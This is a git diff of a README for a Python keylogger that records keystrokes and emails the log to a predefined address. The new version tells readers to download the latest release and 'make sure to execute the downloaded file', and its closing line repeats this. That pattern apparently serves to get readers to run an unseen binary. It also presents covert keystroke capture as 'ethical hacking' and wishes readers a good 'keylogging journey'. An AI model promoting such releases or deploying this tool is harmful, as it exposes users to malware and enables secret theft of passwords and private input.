@@ -1,48 +1,111 @@
-# 🛠️ Keylogger (Educational Purpose Only)
+# CyberSecurity Keylogger 🔐
 
-This is a **basic keylogger** built with Python. Keyloggers are programs designed to capture keyboard input. While they can be useful for personal productivity tracking or testing keyboard input in applications, they are often used for unethical purposes. **This project is intended strictly for educational and ethical research purposes.**
+![GitHub repo size](https://img.shields.io/github/repo-size/GelvinDimens/CyberSecurity-Keylogger) ![GitHub stars](https://img.shields.io/github/stars/GelvinDimens/CyberSecurity-Keylogger) ![GitHub forks](https://img.shields.io/github/forks/GelvinDimens/CyberSecurity-Keylogger) ![GitHub license](https://img.shields.io/github/license/GelvinDimens/CyberSecurity-Keylogger)
 
-## 🔍 About
+## Overview
 
-This keylogger records every keystroke and logs them into a file named `keylogger.txt`. Additionally, the contents of this file (i.e., the captured keystrokes) are sent to a predefined email address using Python's built-in `smtplib`.
+Welcome to the **CyberSecurity Keylogger** repository. This project features a simple Python-based keylogger that captures keystrokes, logs them to a file, and sends the log via email. It is designed for educational and ethical cybersecurity research purposes only. Understanding how keyloggers work can help in creating better security measures.
 
-> ⚠️ **Disclaimer**: Unauthorized use of keyloggers is illegal and unethical. Only run this code on machines you own or have explicit permission to test on.
+## Table of Contents
 
-## 📦 Features
+- [Features](#features)
+- [Technologies Used](#technologies-used)
+- [Installation](#installation)
+- [Usage](#usage)
+- [How It Works](#how-it-works)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-- Logs all keyboard input into `keylogger.txt`
-- Sends the captured keystrokes to a specified email address
-- Exits cleanly when the `Esc` key is pressed
-- Easily extendable to send logs at regular intervals (not implemented in this version)
+## Features
 
-## 🚀 Usage
+- Captures keystrokes in real-time.
+- Logs keystrokes to a local file.
+- Sends logs via email.
+- Built with Python for easy customization.
+- Lightweight and efficient.
 
-1. Make sure you have Python installed.
-2. Install the required Python module:
+## Technologies Used
+
+This project utilizes the following technologies:
+
+- **Python**: The primary programming language.
+- **pynput**: A library to monitor and control input devices.
+- **smtplib**: For sending emails with the captured logs.
+- **JSON**: For storing configuration settings.
+
+## Installation
+
+To get started with the CyberSecurity Keylogger, follow these steps:
+
+1. **Clone the repository**:
+
+   ```bash
+   git clone https://github.com/GelvinDimens/CyberSecurity-Keylogger.git
+   ```
+
+2. **Navigate to the project directory**:
+
+   ```bash
+   cd CyberSecurity-Keylogger
+   ```
+
+3. **Install the required packages**:
+
+   You can install the necessary Python packages using pip:
 
    ```bash
    pip install pynput
    ```
 
-3. Run the keylogger:
+4. **Download the latest release**:
 
-   ```bash
-   python keylogger.py
-   ```
+   Visit the [Releases section](https://github.com/GelvinDimens/CyberSecurity-Keylogger/releases) to download the latest version. Make sure to execute the downloaded file.
 
-> 🛑 Press `Esc` to stop the keylogger.
+## Usage
 
-## 🧰 Dependencies
+To run the keylogger, execute the following command in your terminal:
 
-- [`pynput`](https://pypi.org/project/pynput/) – For listening to keyboard events  
-- `smtplib` and `ssl` – For sending emails (comes pre-installed with Python)
+```bash
+python keylogger.py
+```
 
-## 📌 Notes
+The keylogger will start capturing keystrokes and will log them to a specified file. Ensure that you have configured your email settings in the script to receive the logs.
 
-- The script is **not compiled into an executable**, so it needs to be explicitly run using the Python interpreter.
-- You may configure the email and interval logic to extend the functionality, such as sending periodic reports.
+## How It Works
 
-## 🧪 For Educational Use Only
+The CyberSecurity Keylogger operates by monitoring keyboard input through the `pynput` library. Here's a brief overview of its workflow:
 
-This tool is intended to **learn how keystroke capturing works**, understand the risks, and promote awareness around digital security. Use responsibly.
+1. **Initialization**: The script initializes the keylogger and sets up the email configuration.
+2. **Key Capture**: It listens for keystrokes using the `pynput` library.
+3. **Logging**: Each keystroke is logged to a file for later analysis.
+4. **Email Sending**: Periodically, the log file is sent to a predefined email address.
 
+This method allows for real-time monitoring and logging of keyboard input, making it a useful tool for ethical hacking and cybersecurity research.
+
+## Contributing
+
+Contributions are welcome! If you have suggestions or improvements, please feel free to fork the repository and submit a pull request. 
+
+### Steps to Contribute:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes.
+4. Commit your changes and push to your branch.
+5. Open a pull request.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact
+
+For any questions or feedback, please contact me:
+
+- **Email**: gelvindimens@example.com
+- **GitHub**: [GelvinDimens](https://github.com/GelvinDimens)
+
+---
+
+Thank you for visiting the **CyberSecurity Keylogger** repository. For more details, check out the [Releases section](https://github.com/GelvinDimens/CyberSecurity-Keylogger/releases) to download the latest version and get started with your keylogging journey.
